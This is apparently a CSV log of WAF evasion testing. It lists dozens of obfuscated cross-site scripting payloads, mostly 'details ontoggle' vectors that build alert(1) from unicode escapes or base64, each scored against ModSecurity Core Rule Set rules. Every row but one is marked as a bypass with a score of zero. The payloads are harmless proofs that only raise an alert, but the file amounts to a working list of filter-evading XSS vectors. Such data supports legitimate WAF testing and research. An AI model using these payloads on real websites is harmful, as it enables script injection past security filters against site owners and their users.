index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
19,<svg onload=Function(atob('YWxlcnQoMSk='))()>,0,1,block,4,"941100,941120,941160,949110","v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628753158.536280
278,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details open><summary></summary></details></details>,0,1,bypass,2,"941100,941120","v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628774118.841303
279,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><details open><summary></summary></details></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628774129.913662
280,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details open><summary></summary></details></details>",0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628774254.806272
281,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details open><summary></summary></details></details>,0,1,bypass,2,"941100,941120","v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628774323.466555
282,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><details open><summary></summary></details></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628774475.083655
304,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074&#40;1&#41;&quot;)()"" open>",0,1,bypass,2,"941100,941120","v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628776348.127750
308,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()&#59;"" open>",0,1,bypass,2,"941100,941120","v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628776620.091427
310,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details><details></details></details></details>",0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628776898.027435
311,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details><details></details></details></details>,0,1,bypass,2,"941100,941120","v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628776962.758325
312,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><details><details></details></details></details>,0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777028.725972
313,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details><details></details></details></details>",0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777059.264674
314,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details><details></details></details></details>,0,1,bypass,2,"941100,941120","v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777154.995417
315,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><details><details></details></details></details>,0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777292.457983
316,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details open><details></details></details></details>",0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777353.989439
317,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details open><details></details></details></details>,0,1,bypass,2,"941100,941120","v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777334.813192
318,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><details open><details></details></details></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777496.594245
319,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details open><details></details></details></details>",0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777581.655332
320,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details open><details></details></details></details>,0,1,bypass,2,"941100,941120","v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777623.309686
321,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><details open><details></details></details></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777644.959832
322,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details><details open></details></details></details>",0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777714.087893
323,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details><details open></details></details></details>,0,1,bypass,2,"941100,941120","v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777870.826574
324,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><details><details open></details></details></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777985.546406
325,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details><details open></details></details></details>",0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628778032.465268
326,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details><details open></details></details></details>,0,1,bypass,2,"941100,941120","v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628778066.678850
327,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><details><details open></details></details></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762877815.520750
328,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details open><details open></details></details></details>",0,1,bypass,2,"941100,941120","v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762877825.926382
329,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details open><details open></details></details></details>,0,1,bypass,2,"941100,941120","v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628778311.421885
330,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><details open><details open></details></details></details>,0,1,bypass,2,"941100,941120","v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628778334.232543
331,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details open><details open></details></details></details>",0,1,bypass,2,"941100,941120","v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628778464.920579
332,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details open><details open></details></details></details>,0,1,bypass,2,"941100,941120","v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628778588.689638
333,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><details open><details open></details></details></details>,0,1,bypass,2,"941100,941120","v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628778699.646761
334,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><summary><details open></details></summary></details>",0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628778627.589843
335,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><summary><details open></details></summary></details>,0,1,bypass,2,"941100,941120","v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628778760.967417
336,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><summary><details open></details></summary></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628778833.950023
337,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><summary><details open></details></summary></details>",0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628778916.338207
338,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><summary><details open></details></summary></details>,0,1,bypass,2,"941100,941120","v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628779067.523871
339,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><summary><details open></details></summary></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628779129.718846
340,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><summary><details id=x></details></summary></details>",0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628779212.107304
341,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><summary><details id=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628779389.711611
342,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><summary><details id=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628779363.894690
343,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><summary><details id=x></details></summary></details>",0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628779454.049365
344,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><summary><details id=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628779587.134836
345,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><summary><details id=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628779688.372484
346,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><summary><details class=x></details></summary></details>",0,1,bypass,2,"941100,941120","v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628779760.620518
347,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><summary><details class=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628779763.356525
348,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><summary><details class=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762877981.262913
349,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><summary><details class=x></details></summary></details>",0,1,bypass,2,"941100,941120","v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628779987.023672
350,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><summary><details class=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780079.843209
351,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><summary><details class=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780160.197049
352,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><summary><details open id=x></details></summary></details>",0,1,bypass,2,"941100,941120","v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780195.543489
353,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><summary><details open id=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780241.780050
354,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><summary><details open id=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780367.084760
355,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><summary><details open id=x></details></summary></details>",0,1,bypass,2,"941100,941120","v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780448.060651
356,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><summary><details open id=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780543.734369
357,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><summary><details open id=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780643.748505
358,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><summary><details open class=x></details></summary></details>",0,1,bypass,2,"941100,941120","v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780768.608400
359,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><summary><details open class=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780792.577338
360,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><summary><details open class=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780851.814244
361,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><summary><details open class=x></details></summary></details>",0,1,bypass,2,"941100,941120","v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780968.552945
362,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><summary><details open class=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628781086.202949
363,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><summary><details open class=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628781127.675402
364,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details><summary><details></details></summary></details>",0,1,bypass,2,"941100,941120","v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762878123.345465
